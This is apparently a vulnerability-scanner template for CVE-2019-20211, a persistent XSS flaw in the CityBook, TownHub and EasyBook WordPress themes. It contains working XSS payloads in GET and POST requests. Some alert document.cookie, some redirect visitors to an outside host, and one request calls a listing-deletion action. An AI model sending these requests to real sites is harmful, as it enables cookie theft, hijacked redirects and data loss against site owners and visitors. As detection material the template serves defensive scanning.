id: CVE-2019-20211

info:
  name: Persistent XSS in WordPress Themes
  author: ProjectDiscoveryAI
  severity: medium
  description: The CTHthemes CityBook before 2.3.4, TownHub before 1.0.6, and EasyBook before 1.2.2 themes for WordPress allow Persistent XSS via various input fields.
  impact: |
    Allows attackers to inject malicious scripts into the website, leading to potential data theft or unauthorized actions.
  remediation: |
    Update WordPress Themes to the latest patched versions to mitigate the persistent XSS vulnerability (CVE-2019-20211).
  reference:
    - https://themeforest.net/item/citybook-directory-listing-wordpress-theme/21694727
    - https://themeforest.net/item/easybook-directory-listing-wordpress-theme/23206622
    - https://themeforest.net/item/townhub-directory-listing-wordpress-theme/25019571
    - https://wpvulndb.com/vulnerabilities/10013
    - https://wpvulndb.com/vulnerabilities/10014
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2019-20211
    cwe-id: CWE-79
    epss-score: 0.00704
    epss-percentile: 0.80939
    cpe: cpe:2.3:a:cththemes:citybook:*:*:*:*:*:wordpress:*:*
  metadata:
    vendor: cththemes
    product: citybook
    framework: wordpress

http:
  - method: GET
    path:
      - "{{BaseURL}}/?search_term=%3Cimg+src%3Dx+onerror%3Dalert%28document.cookie%29%3E&checkin=&checkout=&adults=1&children=0"
      - "{{BaseURL}}/?search_term=%3Cimg+src%3Dx+onerror%3Dwindow.location%3D%60https%3A%2F%2Fm0ze.ru%60%3B%3E&checkin=&checkout=&adults=1&children=0"

    matchers:
      - type: word
        words:
          - "<img src=x onerror=alert(document.cookie)>"
          - "<img src=x onerror=window.location=`https://m0ze.ru`;"
        part: body

  - method: POST
    path:
      - "{{BaseURL}}/wp-admin/admin-ajax.php"

    body: |
      action=citybook_addons_chat_reply&_nonce=x75ac6299d&cid=1020&user_id=XXX&touid=1&reply_text=<img src=x onerror=alert(`m0ze`)>
      action=citybook_addons_chat_reply&_nonce=x75ac6299d&cid=1020&user_id=XXX&touid=1&reply_text=<img src=x onerror=window.location=`https://m0ze.ru`;>
    matchers:
      - type: word
        words:
          - "<img src=x onerror=alert(`m0ze`)>"
          - "<img src=x onerror=window.location=`https://m0ze.ru`;"
        part: body

  - method: POST
    path:
      - "{{BaseURL}}/wp-admin/admin-ajax.php"

    body: |
      lid=XXXX&action=citybook_addons_delete_listing&_nonce=3fb56225d8&_wpnonce=3fb56225d8
    matchers:
      - type: word
        words:
          - "action=citybook_addons_delete_listing"
        part: body
